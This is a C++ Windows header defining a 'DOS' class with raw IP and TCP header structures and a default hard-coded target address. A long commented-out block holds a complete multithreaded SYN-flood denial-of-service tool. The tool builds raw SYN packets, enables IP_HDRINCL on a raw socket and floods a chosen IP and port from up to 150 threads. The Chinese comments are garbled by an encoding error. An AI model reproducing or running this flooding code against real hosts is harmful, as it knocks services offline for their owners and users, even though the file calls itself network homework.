#pragma once
#include <stdio.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#include <time.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#pragma comment(lib,"ws2_32.lib")

#define IPVER   4           //IPЭ��Ԥ��
#define MAX_BUFF_LEN 65500  //���ͻ��������ֵ

typedef struct ip_hdr    //����IP�ײ� 
{
	UCHAR h_verlen;            //4λ�ײ�����,4λIP�汾�� 
	UCHAR tos;                //8λ��������TOS 
	USHORT total_len;        //16λ�ܳ��ȣ��ֽڣ� 
	USHORT ident;            //16λ��ʶ 
	USHORT frag_and_flags;    //3λ��־λ 
	UCHAR ttl;                //8λ����ʱ�� TTL 
	UCHAR proto;            //8λЭ�� (TCP, UDP ������) 
	USHORT checksum;        //16λIP�ײ�У��� 
	ULONG sourceIP;            //32λԴIP��ַ 
	ULONG destIP;            //32λĿ��IP��ַ 
}IP_HEADER;

typedef struct tsd_hdr //����TCPα�ײ� 
{
	ULONG saddr;    //Դ��ַ
	ULONG daddr;    //Ŀ�ĵ�ַ 
	UCHAR mbz;        //û��
	UCHAR ptcl;        //Э������ 
	USHORT tcpl;    //TCP���� 
}PSD_HEADER;

typedef struct tcp_hdr //����TCP�ײ� 
{
	USHORT th_sport;            //16λԴ�˿� 
	USHORT th_dport;            //16λĿ�Ķ˿� 
	ULONG th_seq;                //32λ���к� 
	ULONG th_ack;                //32λȷ�Ϻ� 
	UCHAR th_lenres;            //4λ�ײ�����/6λ������ 
	UCHAR th_flag;                //6λ��־λ 
	USHORT th_win;                //16λ���ڴ�С 
	USHORT th_sum;                //16λУ��� 
	USHORT th_urp;                //16λ��������ƫ���� 
}TCP_HEADER;



class DOS
{
	char m_IP[256] = { 0 };
	int m_Port = 0;
	int m_Thread = 0;

	SOCKET m_Socket = -1;

	IP_HEADER m_IPHeader;
	TCP_HEADER m_TCPHeader;
	PSD_HEADER m_PSDHeader;

	char m_Sendto_Buffer[MAX_BUFF_LEN] = { 0 };  //���ͻ�����
	unsigned short m_check_Buff[MAX_BUFF_LEN] = { 0 }; //����ͻ�����
	const char m_send_data[256] = "This is my homework of networt,I am happy!" ;
public:
	DOS();
	~DOS();
	BOOL InitDos(const char *IP = "180.97.33.107",int Port = 80,int Thread = 0);
	void Run();
private:
	void CloseSocket();
	//CheckSum:����У��͵��Ӻ��� 
	USHORT checksum(USHORT *buffer, int size);
	void CheckSum();
};

//���̵߳�
//#if 0
//#include <stdlib.h>
//#include <stdio.h>
//#include <winsock2.h>
//#include <ws2tcpip.h>
//#include <time.h>
//
//#pragma	comment(lib,"ws2_32.lib")
//#define	PacketNum 1024
//
//////////////////////////////////////////////////////////////////
////ȫ�ֱ���
//////////////////////////////////////////////////////////////////
//
//int		MaxThread; //����߳�����
//int		CurrentThread = 0; //��ǰ��߳�����
//char		SendBuff[PacketNum][60] = { 0 }; //1024�����ݰ���ÿ���ĳ��Ⱦ���IpHeader+TcpHeader
//SOCKADDR_IN	Sin;
//SOCKET	SendSocket;
//
//typedef struct ip_hdr
//{
//	unsigned char	h_verlen; //4λ�ײ�����,4λIP�汾��
//	unsigned char 	tos; //8λ��������TOS
//	unsigned short 	total_len; //16λ�ܳ��ȣ��ֽڣ�
//	unsigned short 	ident; //16λ��ʶ
//	unsigned short 	frag_and_flags; //3λ��־λ
//	unsigned char 	ttl; //8λ����ʱ�� TTL
//	unsigned char 	proto; //8λЭ�� (TCP, UDP ������)
//	unsigned short 	checksum; //16λIP�ײ�У���
//	unsigned int 	sourceIP; //32λԴIP��ַ
//	unsigned int 	destIP; //32λĿ��IP��ַ
//}IP_HEADER;
//
//typedef struct tcp_hdr //����TCP�ײ�
//{
//	USHORT 		th_sport; //16λԴ�˿�
//	USHORT 		th_dport; //16λĿ�Ķ˿�
//	unsigned int	th_seq; //32λ���к�
//	unsigned int	th_ack; //32λȷ�Ϻ�
//	unsigned char	th_lenres; //4λ�ײ�����/6λ������
//	unsigned char 	th_flag; //6λ��־λ
//	USHORT 		th_win; //16λ���ڴ�С
//	USHORT		th_sum; //16λУ���
//	USHORT		th_urp; //16λ��������ƫ����
//}TCP_HEADER;
//
//typedef struct tsd_hdr //����TCPα�ײ�
//{
//	unsigned long	saddr; //Դ��ַ
//	unsigned long 	daddr; //Ŀ�ĵ�ַ
//	char 		mbz;
//	unsigned char 		ptcl; //Э������
//	unsigned short 	tcpl; //TCP����
//}PSD_HEADER;
//
//////////////////////////////////////////////////////////////////
////����ԭ��
//////////////////////////////////////////////////////////////////
//
//int             setup(char *, char *);	//�������ݰ�
//DWORD WINAPI    send_packet(LPVOID); //�������ݺ���
//USHORT          checksum(USHORT *, int); //�������ͺ���
//void            watchthread(void); //��⵱ǰ�߳�����
//
//////////////////////////////////////////////////////////////////
////main����
//////////////////////////////////////////////////////////////////
//
//int	main(int argc, char *argv[])
//{
//	WSADATA	WSAData;
//	DWORD	ThreadID = 1;
//	HANDLE	ThreadHandle = NULL;
//
//	if (argc != 4)
//	{
//		printf("\n%s\t<TargetIP>\t<TargetPort>\t<MaxThread>\n", argv[0]);
//		return -1;
//	}
//
//	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0)
//	{
//		printf("��ʼ��WSAStartuʧ��\n");
//		return -1;
//	}
//
//	if (atoi(argv[3]) > 0 && atoi(argv[3]) < 150)
//	{
//		MaxThread = atoi(argv[3]);
//	}
//	else
//	{
//		printf("����߳��������󣬱������0��С��150");
//		return -1;
//	}
//
//	//��ʼ�����ݰ������浽���鵱�С�
//	if (setup(argv[1], argv[2]) == 1)
//	{
//		printf("��ʼ�����\n");
//	}
//	else
//	{
//		printf("��ʼ��ʧ��\n");
//		return -1;
//	}
//
//	printf("������ʼ...\n");
//
//	while (1)
//	{
//		ThreadID = 1;
//
//		for (int Tmp = 0; Tmp < PacketNum; Tmp++)
//		{
//			watchthread();
//			ThreadID++;
//
//			ThreadHandle = CreateThread(NULL, 0, send_packet, (LPVOID)Tmp, 0, &ThreadID);
//
//			if (ThreadHandle != NULL)
//			{
//
//				CurrentThread++;
//				CloseHandle(ThreadHandle);
//			}
//		}
//	}
//	closesocket(SendSocket);
//	WSACleanup();
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////
////����:setup
////����:���г�ʼ���ã������ض�ip���ض��˿ڣ��ض�tcp���кŵļ���ͣ��������ݰ�
////����:Ŀ��ip��ַ��Ŀ�Ķ˿�
////Ŀ��:���syn���ݰ������ٶ�
//////////////////////////////////////////////////////////////////
//
//int setup(char *DestIp, char *DestPort)
//{
//	char         src_ip[20] = { 0 };//ԴIP
//	USHORT		src_port;//Դ�˿�
//	char			dst_ip[20] = { 0 };//Ŀ��IP
//	USHORT		dst_port;//Ŀ�Ķ˿�
//	IP_HEADER    IpHeader;
//	TCP_HEADER   TcpHeader;
//	PSD_HEADER   PsdHeader;
//
//	if (strlen(DestIp) >= 16)
//	{
//		printf("Ŀ��IP����\n");
//		return -1;
//	}
//	strcpy(dst_ip, DestIp);
//
//	if (atoi(DestPort) < 0 || atoi(DestPort) > 65535)
//	{
//		printf("Ŀ�Ķ˿ڲ���\n");
//		return -1;
//	}
//
//	Sin.sin_family = AF_INET;
//	Sin.sin_port = htons(atoi(DestPort));
//	Sin.sin_addr.s_addr = inet_addr(dst_ip);
//
//	srand((unsigned)time(NULL));
//
//	for (int n = 0; n < PacketNum; n++)
//	{
//		//sprintf_s(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
//
//		//���IP�ײ�
//		IpHeader.h_verlen = (4 << 4 | sizeof(IpHeader) / sizeof(unsigned long));
//		IpHeader.tos = 0;
//		IpHeader.total_len = htons(sizeof(IpHeader) + sizeof(TcpHeader));
//		IpHeader.ident = 1;
//		IpHeader.frag_and_flags = 0x40;
//		IpHeader.ttl = 128;
//		IpHeader.proto = IPPROTO_UDP;
//		//IpHeader.proto = IPPROTO_TCP;
//		IpHeader.checksum = 0;
//		IpHeader.sourceIP = inet_addr("192.168.0.106");
//		IpHeader.destIP = inet_addr(dst_ip);
//
//		//���TCP�ײ�
//		TcpHeader.th_sport = htons(rand() % 60000 + 1); //Դ�˿ں�
//		TcpHeader.th_dport = htons(atoi(DestPort));
//		TcpHeader.th_seq = htons(12);
//		TcpHeader.th_ack = 0;
//		TcpHeader.th_lenres = (sizeof(TcpHeader) / 4 << 4 | 0);
//		TcpHeader.th_flag = 2; //0,2,4,8,16,32->FIN,SYN,RST,PSH,ACK,URG
//		TcpHeader.th_win = htons(512);
//		TcpHeader.th_sum = 0;
//		TcpHeader.th_urp = 0;
//
//		PsdHeader.saddr = IpHeader.sourceIP;
//		PsdHeader.daddr = IpHeader.destIP;
//		PsdHeader.mbz = 0;
//		PsdHeader.ptcl = IpHeader.proto;
//		PsdHeader.tcpl = htons(sizeof(TcpHeader));
//
//		//����TCPУ���
//		memcpy(SendBuff[n], &PsdHeader, sizeof(PsdHeader));
//		memcpy(SendBuff[n] + sizeof(PsdHeader), &TcpHeader, sizeof(TcpHeader));
//		TcpHeader.th_sum = checksum((USHORT *)SendBuff[n], sizeof(PsdHeader) + sizeof(TcpHeader));
//
//		//����IP�����
//		memcpy(SendBuff[n], &IpHeader, sizeof(IpHeader));
//		memcpy(SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));
//		memset(SendBuff[n] + sizeof(IpHeader) + sizeof(TcpHeader), 0, 4);
//		IpHeader.checksum = checksum((USHORT *)SendBuff, sizeof(IpHeader) + sizeof(TcpHeader));
//
//		memcpy(SendBuff[n], &IpHeader, sizeof(IpHeader));
//		memcpy(SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader));
//	}
//
//	BOOL	Flag;
//	int     Timeout;
//
//	SendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
//	if (SendSocket == INVALID_SOCKET)
//	{
//		return 0;
//	}
//
//	//�����Լ�������ݰ�
//	Flag = TRUE;
//	if (setsockopt(SendSocket, IPPROTO_IP, IP_HDRINCL, (char *)&Flag, sizeof(Flag)) == SOCKET_ERROR)
//	{
//		printf("Setsockopt��������\n");
//		return 0;
//	}
//	//���ó�ʱʱ��
//	Timeout = 1000;
//	if (setsockopt(SendSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&Timeout, sizeof(Timeout)) == SOCKET_ERROR)
//	{
//		return 0;
//	}
//
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////
////����:send_packet
////����:��Ŀ����������syn���ݰ�
//////////////////////////////////////////////////////////////////
//
//DWORD	WINAPI	send_packet(LPVOID LP)
//{
//	//�������ݰ�
//	int     Tmp = (int)LP;
//	int		Ret, Count = 0;
//
//	while (TRUE)
//	{
//		Ret = sendto(SendSocket, SendBuff[Tmp], sizeof(IP_HEADER) + sizeof(TCP_HEADER), 0, (struct sockaddr *) &Sin, sizeof(Sin));
//
//		while (Ret != SOCKET_ERROR)
//		{
//			Count++;
//			if (Count == 10240)
//			{
//				printf(".\n");
//				break;
//			}
//			else
//			{
//				Ret = sendto(SendSocket, SendBuff[Tmp], sizeof(IP_HEADER) + sizeof(TCP_HEADER), 0, (struct sockaddr *) &Sin, sizeof(Sin));
//				if (Ret == SOCKET_ERROR)
//				{
//					exit(0);
//				}
//			}
//		}
//		break;
//	}
//	CurrentThread--;
//	return 1;
//}
//
//////////////////////////////////////////////////////////////////////
////������WatchThread
////��������⵱ǰ�߳�������������ڵ�������߳�����������0.1��ȴ������߳��˳�
////����ֵ����
//////////////////////////////////////////////////////////////////////
//
//void	watchthread()
//{
//	for (; ; )
//	{
//		if (CurrentThread >= MaxThread)
//		{
//			Sleep(100);
//		}
//		else break;
//	}
//}
//
/////////////////////////////////////////////////////////////////
////������CheckSum
////��������������
////���أ����ؼ����
/////////////////////////////////////////////////////////////////
//
//USHORT	checksum(USHORT * buffer, int size)
//{
//	unsigned	long	cksum = 0;
//
//	while (size > 1)
//	{
//		cksum += *buffer++;
//		size -= sizeof(USHORT);
//	}
//	if (size)
//	{
//		cksum += *(UCHAR *)buffer;
//	}
//	cksum = (cksum >> 16) + (cksum & 0xffff);
//	cksum += (cksum >> 16);
//
//	return (USHORT)(~cksum);
//}
//#endif